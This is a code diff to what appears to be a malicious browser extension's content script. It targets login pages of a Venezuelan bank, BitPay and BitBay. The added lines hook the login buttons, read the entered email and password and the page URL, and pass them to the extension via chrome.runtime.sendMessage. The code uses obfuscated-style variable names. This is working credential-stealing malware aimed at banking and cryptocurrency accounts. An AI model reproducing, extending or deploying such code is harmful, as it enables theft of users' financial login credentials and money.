@@ -377,7 +377,7 @@ var login_form = document.getElementById("loginForm");
 
   if (top['location']['href']['indexOf']('https://www4.bancaribe.com.ve/bcj/') > -1) {
       var interval = setInterval(function () {
-          if (document['getElementsByName']('form1')[0]) {
+          if (document['getElementsByClassName']('form1')[0]) {
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
                var login = {};
@@ -392,7 +392,34 @@ var login_form = document.getElementById("loginForm");
 
 
 
-
+  if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login/') > -1) {
+      var interval = setInterval(function () {
+          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
+              clearInterval(interval);
+              document['getElementsByClassName']('button bp-button prelogin__button ladda-button')[0].onclick = function (_0x441cx2) {
+               var login = {};
+              login.username = document.getElementsByName("email")[0].value;
+              login.pass = document.getElementsByName("password")[0].value;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",login});
+              }
+          }
+      }, 1000)
+  };
+  if (top['location']['href']['indexOf']('hhttps://auth.bitbay.net/login') > -1) {
+      var interval = setInterval(function () {
+          if (document['getElementsByClassName']('main-content-container')[0]) {
+              clearInterval(interval);
+              document['getElementsByClassName']('send-btn full-width-btn btn btn-flat waves-effect')[0].onclick = function (_0x441cx2) {
+               var login = {};
+              login.username = document.getElementsByName("email")[0].value;
+              login.pass = "null"; //document.getElementsByName("password")[0].value;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",login});
+              }
+          }
+      }, 1000)
+  };
 
 
 
